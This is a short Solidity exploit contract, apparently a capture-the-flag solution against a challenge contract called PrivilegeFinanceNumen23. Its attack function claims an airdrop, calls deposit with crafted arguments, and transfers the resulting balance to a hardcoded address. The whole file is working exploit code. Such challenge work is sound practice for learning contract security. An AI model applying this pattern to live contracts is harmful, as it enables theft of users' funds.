// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "hardhat/console.sol";
import "./PrivilegeFinance.sol";

contract PrivilegeFinanceNumen23Attack {

    function attack(address target) public {
        PrivilegeFinanceNumen23 p = PrivilegeFinanceNumen23(target);
        p.Airdrop();
        p.deposit(address(this), 1, msg.sender);
        p.transfer(0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b, p.balances(address(this)));
    }
} 
    